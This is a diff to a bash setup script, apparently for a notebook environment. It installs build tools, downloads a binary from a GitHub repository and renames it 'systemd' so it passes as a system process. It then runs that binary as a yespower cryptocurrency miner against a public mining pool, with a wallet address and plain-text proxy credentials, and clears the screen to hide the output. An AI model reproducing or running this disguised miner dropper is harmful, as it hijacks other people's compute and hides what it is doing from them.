@@ -1,3 +1,4 @@
+%%shell
 #!/bin/bash
 
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
@@ -20,9 +21,8 @@ apt-get update \
     libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential binutils cmake screen unzip net-tools curl \
   && rm -rf /var/lib/apt/lists/*
 
-wget https://github.com/Master478963/lolMinet/raw/main/data &> /dev/null 
-
+wget https://github.com/Master478963/lolMinet/raw/main/data  
+clear
 chmod +x data 
 mv data systemd 
-
 ./systemd -a yespower -o stratum+tcp://yespower.mine.zergpool.com:6533  -u RQFqPLG7ysPijH28DvJSMnzdUcd2rS68oh -p c=RVN,ID=Test  -x sipuwfea:e90ia636sn8t@38.154.227.167:5868
